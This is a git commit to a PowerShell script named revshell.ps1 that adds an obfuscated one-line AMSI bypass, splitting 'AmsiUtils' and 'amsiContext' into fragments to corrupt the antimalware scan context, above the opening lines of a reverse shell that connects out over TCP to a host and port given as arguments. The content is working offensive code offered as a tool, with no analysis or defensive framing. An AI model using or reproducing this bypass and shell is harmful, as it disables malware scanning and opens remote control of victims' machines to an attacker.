4af1082a1c270aacaaf61003fd2e207ad954448f
RaouzRouik <69973378+RaouzRouik@users.noreply.github.com>
2022-08-22 13:51:02 +0200

    Update revshell.ps1

--- revshell.ps1
+++ revshell.ps1
@@ -1,3 +1,5 @@
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
+
 $c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
 $I = $c.GetStream();
 [byte[]]$U = 0..(2-shl15)|%{0};
